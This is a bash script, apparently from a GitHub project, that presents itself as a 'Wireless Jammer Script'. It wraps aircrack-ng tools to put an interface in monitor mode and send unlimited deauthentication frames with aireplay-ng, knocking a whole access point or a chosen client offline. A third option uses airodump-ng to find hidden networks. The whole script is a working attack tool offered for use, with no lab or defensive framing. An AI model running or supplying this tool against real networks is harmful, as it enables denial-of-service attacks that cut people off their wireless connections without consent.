#!/bin/bash
# https://github.com/deadport/apkill
# Warning: this is noob scripting, tipps on how things can be done better are welcome, thanks. 
# Dependencies: net-tools, egrep, aircrack-ng
if [ ! -d '/etc/apt' ]
then
echo "WARNING:You appear to not be using a debianesque System! Please review the script to change the needed bits."
fi
echo "checking for dependencies.."
if [ ! -f '/usr/bin/aircrack-ng' ]
then
echo "loading aircrack.."
sudo apt install aircrack-ng -y > /dev/null
fi
if [ ! -f '/bin/egrep' ]
then
echo "loading egrep.."
sudo apt install egrep -y > /dev/null
fi
if [ ! -f '/sbin/iwlist' ]
then
echo "loading net-tools.."
sudo apt install net-tools -y > /dev/null
fi
echo "dependency check done.." && clear
#end of dependencie check
#functions
function jumpto
{
    label=$1
    cmd=$(sed -n "/$label:/{:a;n;p;ba};" $0 | grep -v ':$')
    eval "$cmd"
    exit
}
start=${1:-"start"}
#end of functions section
clear
#artwork
tput setaf 1
echo "        / /\                /\ \       /\_\            /\ \       _\ \          _\ \   " 
echo "       / /  \              /  \ \     / / /  _         \ \ \     /\__ \        /\__ \  "
echo "      / / /\ \            / /\ \ \   / / /  /\_\       /\ \_\   / /_ \_\      / /_ \_\ "
echo "     / / /\ \ \          / / /\ \_\ / / /__/ / /      / /\/_/  / / /\/_/     / / /\/_/ "
echo "    / / /  \ \ \        / / /_/ / // /\_____/ /      / / /    / / /         / / /      "
echo "   / / /___/ /\ \      / / /__\/ // /\_______/      / / /    / / /         / / /       "
echo "  / / /_____/ /\ \    / / /_____// / /\ \ \        / / /    / / / ____    / / / ____   "
echo " / /_________/\ \ \  / / /      / / /  \ \ \   ___/ / /__  / /_/_/ ___/\ / /_/_/ ___/\ "
echo "/ / /_       __\ \_\/ / /      / / /    \ \ \ /\__\/_/___\/_______/\__\//_______/\__\/ "
echo "\_\___\     /____/_/\/_/       \/_/      \_\_\\/_________/\_______\/    \_______\/     "
echo "		The Wireless Jammer Script for debianesque systems	"
echo "								                                        "
tput sgr0
#end of artwork
#opt
echo "Choose an attack option[single client(c) whole AP(a) find hidden(h)]:"
read ask
#opt end
iwconfig
echo "Interface name(e.g. wlan0):"
read inter
clear
echo "scanning networks.."
sudo iwlist $inter scan | egrep 'Address|ESSID|Channel|Quality'
echo "Choose Channel: (can be ignored if searching for hidden AP)"
read chan
echo "Please wait.. monitor mode is being enabled.."
trap 'tput setaf 1 && echo "deactivating monitor mode.." && airmon-ng stop $inter\mon > /dev/null && exit 1' INT
sudo airmon-ng start $inter $chan > /dev/null
echo "MAC of Access-Point: (can be ignored if searching for hidden AP)"
read macacc
echo "loading attack..."
tput setaf 1
jumpto $ask
a:
sudo aireplay-ng -0 0 -a $macacc -b $macacc $inter\mon
sudo airmon-ng stop $inter\mon > /dev/null
tput sgr0
exit 0
#options
c:
echo "How long should be searched for Clients? [sec]:"
read secs
echo "reading clients from network.. [scanning $secs seconds]"
sudo timeout --kill-after=$secs --foreground $secs airodump-ng -M -U -c $chan -d $macacc $inter\mon
echo "Client MAC:"
read clientmac
tput setaf 1
sudo service network-manager stop
sudo aireplay-ng -0 0 -a $macacc -c $clientmac $inter\mon
sudo service network-manager start
sudo airmon-ng stop $inter\mon > /dev/null
tput sgr0
exit 0
h:
echo "How long to scan? [sec]:"
read secs
echo "scanning.. [$secs sec]"
{ sudo airodump-ng $inter\mon 2>> temp.txt; } &
PID=$! > /dev/null
sleep $secs
kill -TERM $PID > /dev/null
sudo airmon-ng stop $inter\mon > /dev/null
clear
clear
echo "Hidden APs are:"
echo "	"
cat temp.txt | grep length | uniq --check-chars=18
if [ -f 'temp.txt' ]
then
echo "scan successfull"
else
echo "scan error"
fi
sudo rm temp.txt > /dev/null
exit 0
